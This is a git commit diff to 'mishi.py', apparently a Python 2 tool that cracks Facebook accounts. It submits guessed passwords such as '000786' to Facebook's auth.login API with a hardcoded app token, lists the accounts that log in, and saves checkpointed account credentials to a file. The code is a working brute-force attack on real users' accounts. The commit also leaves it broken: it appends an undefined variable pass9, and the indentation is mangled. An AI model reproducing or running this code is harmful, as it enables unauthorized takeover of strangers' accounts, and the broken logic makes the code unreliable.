43ed59876435aa36508b75e0f19c30e33b835d23
Jam302 <65140038+Jam302@users.noreply.github.com>
2020-05-18 10:26:21 +0500

    Update mishi.py

--- mishi.py
+++ mishi.py
@@ -409,12 +409,14 @@ def pilih_super():
 																	cek.write(user+"|"+pass7+"\n")
 																	cek.close()
 																	cekpoint.append(user+pass7)
-																else:		pass8 = b['last_name'] + '786'
+																
+													else:
+														pass8 = '000786'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
 														print '\x1b[1;92m[OK] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass8 + ' 👽 ' 
-														oks.append(user+pass8)
+														oks.append(user+pass9)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
 															print '\x1b[1;91m[CP] \x1b[1;91mID \x1b[1;91m✯ \x1b[1;91m' + user + ' \x1b[1;91mPass \x1b[1;91m✯ \x1b[1;91m' + pass8 + ' 👽 ' 
@@ -422,20 +424,7 @@ def pilih_super():
 															cek.write(user+"|"+pass8+"\n")
 															cek.close()
 															cekpoint.append(user+pass8)
-															else:
-													pass9 = '000786'
-													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-													q = json.load(data)
-													if 'access_token' in q:
-														print '\x1b[1;92m[OK] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass9 + ' 👽 ' 
-														oks.append(user+pass9)
-													else:
-														if 'www.facebook.com' in q["error_msg"]:
-															print '\x1b[1;91m[CP] \x1b[1;91mID \x1b[1;91m✯ \x1b[1;91m' + user + ' \x1b[1;91mPass \x1b[1;91m✯ \x1b[1;91m' + pass9 + ' 👽 ' 
-															cek = open("out/CP.txt", "a")
-															cek.write(user+"|"+pass9+"\n")
-															cek.close()
-															cekpoint.append(user+pass9)			
+																
 														
 												
 		except:																		
